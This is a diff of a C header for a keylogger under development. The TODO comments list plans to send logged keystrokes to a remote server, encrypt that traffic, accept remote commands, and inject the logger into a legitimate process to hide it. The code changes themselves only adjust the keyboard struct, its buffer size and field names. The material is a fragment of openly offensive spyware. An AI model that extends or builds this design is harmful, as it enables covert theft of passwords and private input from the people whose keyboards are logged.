@@ -5,19 +5,20 @@
 /*
     TODO:
 
-    2. cleanup select handling so that it doesn't suck massive balls
-
-    3. add support for TLS communications / some kind of enc.
-
-    4. enumerate process to see which can be interesting to inject into
-
-    5. use ptrace-less process injection to inject this in a legit program
+    - add message_queue for each key logged
+    - communication with remote server (& logging if debug!!)
+    - add support for TLS communications / some kind of enc.
+    - enumerate process to see which can be interesting to inject into
+    - use ptrace-less process injection to inject this in a legit program
+    - add listener to receive commands such as (sleep, enumeration, etc...)
 */
 
 
 #include <sys/types.h>
 #include <stdint.h>
 #include <sys/queue.h>
+
+#define QUEUE_BUFFER_SIZE 1024
 
 /*
     represents whatever data is currently logged for a single keyboard
@@ -27,11 +28,10 @@ typedef struct keyboard_s keyboard_t;
 struct keyboard_s {
     int fd;
 
-    ssize_t nb_characters;
+    ssize_t nb_chars;
+    char buffer[QUEUE_BUFFER_SIZE];
 
-    char buffer[2048];
     char name[64];
-
     TAILQ_ENTRY(keyboard_s) devices;
 };
 
